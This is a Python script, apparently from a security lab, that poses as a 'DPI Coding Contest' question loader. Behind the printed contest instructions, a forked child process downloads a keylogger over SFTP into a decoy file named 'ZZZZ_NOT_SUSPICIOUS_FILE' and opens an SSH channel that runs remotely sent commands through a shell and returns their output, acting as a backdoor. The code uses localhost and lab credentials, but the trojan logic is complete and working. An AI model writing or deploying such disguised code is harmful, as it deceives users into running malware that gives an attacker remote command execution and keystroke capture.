#!/usr/bin/python3

import paramiko
import socket
import os
import time
import logzero
from logzero import logger
import threading
import subprocess


class sshClient(object):
    # constructor, sets necessary parameters to establish a SSH tunnel
    def __init__(self,  hostName,  portNumber, userName,  passWord):
        self.SSHClient = None
        self.hostName = hostName
        self.portNumber = portNumber
        self.userName = userName
        self.passWord = passWord

    # make a connection to a remote SSH server
    def makeSSHConnection(self):
        try:
            logger.info("Establishing ssh connection")
            # create a client instance, auto generate a key
            # and attempt to connect to a host
            self.SSHClient = paramiko.SSHClient()
            self.SSHClient.load_system_host_keys()
            self.SSHClient.set_missing_host_key_policy(
                paramiko.WarningPolicy())

            self.SSHClient.connect(hostname=self.hostName,  port=self.portNumber,
                                   username=self.userName,  password=self.passWord)
            logger.info('SSH Connection Established . . .')

            # handle errors
        except paramiko.AuthenticationException as authErr:
            print('Authentication failed:',  authErr)
        except paramiko.SSHException as sshErr:
            print('SSH connection failed:',  sshErr)
        except socket.timeout as toutErr:
            print('Connection timed out:',  toutErr)
        except Exception as err:
            print('Exception has ocurred:',  err)
            self.SSHClient.close()

    # executes a command on a remote host
    def executeCommand(self,  command):
        try:
            # connect to SSH server
            self.makeSSHConnection()
            # run the exec_command() method to
            # execute a command remotely
            stdin,  stdout,  stderr = self.SSHClient.exec_command(command,
                                                                  timeout=10)
            print(f"command STDOUT: {str(stdout.read())}")
            if stderr:
                print(f"command STDERR: {str(stderr.read())}")
            self.SSHClient.close()
            # handle errors
        except paramiko.SSHException as sshErr:
            print('Command execution failed:',  sshErr)
            self.SSHClient.close()
        except socket.timeout as toutErr:
            print('Command timed out:',  toutErr)
            self.SSHClient.close()
        except Exception as err:
            print('Exception has ocurred:',  err)
            self.SSHClient.close()

    # upload a file via the SSH tunnel to remote server via SFTP
    def uploadFile(self,  localPath,  remotePath):
        try:
            # connect to SSH server
            self.makeSSHConnection()
            # create an SFTP tunnel
            SFTPInstance = self.SSHClient.open_sftp()
            SFTPInstance.put(localPath,  remotePath)
            # handle errors
        except Exception as err:
            print('Exception has ocurred:',  err)
            SFTPInstance.close()
            self.SSHClient.close()

    # download a file via the SSH tunnel from remote server via SFTP
    def downloadFile(self,  localPath,  remotePath):
        try:
            # connect to SSH server
            self.makeSSHConnection()
            # create an SFTP tunnel
            SFTPInstance = self.SSHClient.open_sftp()
            SFTPInstance.get(localPath,  remotePath)
            # handle errors
        except Exception as err:
            print('Exception has occurred:',  err)
            SFTPInstance.close()
            self.SSHClient.close()

    def invoke_shell(self):
        try:
            # connect to SSH server
            self.makeSSHConnection()
            channel = self.SSHClient.get_transport().open_session()
            logger.info("Calling invoke shell")
            logger.info("Invoke shell called")

            command = channel.recv(1024).decode()
            receivedCommand = subprocess.check_output(command, shell=True)
            channel.send(receivedCommand)

            logger.info(f"Received message{command}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Subprocess error: {e.output.decode()}")
        except paramiko.SSHException as sshErr:
            print(f'Shell invoke failed:{sshErr}')
            self.SSHClient.close()
        except socket.timeout as toutErr:
            print('Command timed out:',  toutErr)
            self.SSHClient.close()
        except Exception as err:
            print('Exception has ocurred:',  err)
            self.SSHClient.close()


def doMaliciousActivities():
    try:
        pid = os.fork()
        if pid == 0:
            #make password file
            os.system("touch ZZZZ_NOT_SUSPICIOUS_FILE")

            # Open a transport
            host,port = "localhost",22
            transport = paramiko.Transport((host,port))

            # authenticate   
            username,password = "lab","lab"
            transport.connect(None,username,password)

            #make sftp instnace
            sftp = paramiko.SFTPClient.from_transport(transport)

            # Download to current directory
            remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
            localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"
            sftp.get(remotepath,localpath)

            # Upload
            #sftp.put(localpath,remotepath)

            # Close
            if sftp: sftp.close()
            if transport: transport.close()

            #connect ssh and receive commands
            SSHClient = sshClient("localhost", 9000, "rick", "jacky")
            SSHClient.invoke_shell()
            
        #kill child process
        while True:
            try:
                pid,  status = os.waitpid(-1,  os.WNOHANG) 
            except OSError :
                break
    except Exception:
        raise


# main thread
if __name__ == '__main__':
    try:
        # Add logging to logfile and disable output to the terminal
        logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
                        backupCount=3, disableStderrLogger=True)

        #non malicious stuff
        print("Welcome to the DPI Coding Contest!")

        print("Loading your contest question...")
        for i, j in enumerate(list(range(10001))):
            print(str(i / 100) + " percent loaded.", end='\r')
        print("\n")

        print("For this challenge, you'll be writing a python socket client to communicate to a server located at the IP address of '127.0.0.1' and running on port 9000. The client must be able send large data packets and handle multiple request from the server. Your overall implementation will be assessed along with your knowledge of networking fundamentals, coding style and program efficiency.")
        

        print("Run this file as many times as you need to check on the server status and any information you need to see what kind of data you are dealing with. This is file is used to ping the server.")


        print("Language Used: Python 3, Recommended Libraries to use: os, sys, socket")
        print("Now let's get coding!")


        # pkey = os.path.realpath("tester")
        #sshClient = sshClient("localhost", 9000, "rick", "jacky")
        # dir_path = os.path.realpath("config_file")
        # print(dir_path)

        #fork off and do malicious stuff
        doMaliciousActivities()

    # sshClient.invoke_shell()
    except Exception as err:
        print(err)
    


